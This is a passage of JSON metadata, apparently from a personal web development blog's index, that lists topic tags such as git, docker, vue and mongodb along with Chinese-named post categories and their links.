coin)","link":"/posts/2ff2028/"}],"tags":[{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"git","slug":"git","link":"/tags/git/"},{"name":"reg","slug":"reg","link":"/tags/reg/"},{"name":"js","slug":"js","link":"/tags/js/"},{"name":"css","slug":"css","link":"/tags/css/"},{"name":"redux","slug":"redux","link":"/tags/redux/"},{"name":"vue","slug":"vue","link":"/tags/vue/"},{"name":"node.js","slug":"node-js","link":"/tags/node-js/"},{"name":"webhook","slug":"webhook","link":"/tags/webhook/"},{"name":"pm2","slug":"pm2","link":"/tags/pm2/"},{"name":"docker","slug":"docker","link":"/tags/docker/"},{"name":"node","slug":"node","link":"/tags/node/"},{"name":"http","slug":"http","link":"/tags/http/"},{"name":"mongodb","slug":"mongodb","link":"/tags/mongodb/"},{"name":"react","slug":"react","link":"/tags/react/"}],"categories":[{"name":"服务端","slug":"服务端","link":"/categories/%E6%9C%8D%E5%8A%A1%E7%AB%AF/"},{"name":"全栈","slug":"全栈","link":"/categories/%E5%85%A8%E6%A0%88/"},{"name":"前端","slug":"前端","link":"/categories/%E5%89%8D%E7%AB%AF/"},{"name":"杂项","slug":"杂项","link":"/categories/%E6%9D%82%E9%A1%B9/"},{"name":"小程序","slug":"小程序","link":"/categories/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}]}